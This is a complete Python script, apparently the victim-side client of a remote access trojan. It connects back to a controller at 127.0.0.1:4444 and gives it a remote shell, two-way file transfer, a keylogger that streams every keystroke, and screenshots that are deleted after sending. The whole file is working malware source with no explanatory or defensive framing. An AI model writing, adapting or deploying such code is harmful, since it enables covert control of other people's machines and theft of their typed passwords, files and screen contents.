#!/usr/bin/env python3

import time
import random
import string
import numpy as np
import cv2
import pyautogui
import socket
import os
import subprocess
import json
import base64
import pynput
from pynput.keyboard import Key,Listener
import multiprocessing
import platform

def reliable_send(client,data):
    jsonData = json.dumps(data)
    client.send(jsonData.encode())

def reliable_recv(client):
    jsonData = ""
    while True:
        try:
            jsonData = jsonData + client.recv(1024).decode()
            return json.loads(jsonData)
        except ValueError:
            continue

def upload(client,fileName):
    f = open(fileName,"wb")
    client.settimeout(1)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()

def download(client,fileName):
    f = open(fileName,"rb")
    client.send(f.read())

def on_press(key):
	try:
		reliable_send(client,str(key.char))
	except AttributeError:
		reliable_send(client,str(key))

def keylog():
	with Listener(on_press=on_press) as listener:
		listener.join()

def screenshot(path):
	image = pyautogui.screenshot()
	image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR)
	cv2.imwrite(path, image)

def shell(cmd):
	result = subprocess.Popen(cmd, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
	output = result.stdout.read() + result.stderr.read()
	return output.decode()

def pathTempFolder(os):
    if os == "Linux":
        path = "/tmp/"
    if os == "Windows":
        temPath = shell("echo %temp%")
        path = str(temPath).strip() + "\\"
    return path

def checkOS():
	os = platform.system()
	return os

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(("127.0.0.1",4444))
while True:
	cmd = reliable_recv(client)
	if cmd == "exit" or cmd == "quit":
		break
	elif cmd == "help" or cmd == "back":
		continue
	elif cmd[:8] == "download":
		arr = cmd.split(" ")
		download(client,arr[1])
	elif cmd[:6] == "upload":
		arr = cmd.split(" ")
		upload(client,arr[2])
	elif cmd[:2] == "cd":
		try:
			os.chdir(cmd[3:])
		except:
			continue
	elif cmd == "keylog":
		p1 = multiprocessing.Process(target=keylog)
		p1.start()
		while True:
			cmd = reliable_recv(client)
			if cmd == "quit":
				p1.terminate()
				break
	elif cmd == "screenshot":
		os = checkOS()
		path = pathTempFolder(os) + "temp.jpg"
		screenshot(path)
		download(client,path)
		time.sleep(3)
		if os == "Linux":
			shell("rm " + path)
		if os == "Windows":
			shell("del " + path)
	else:
		reliable_send(client, shell(cmd))
client.close()

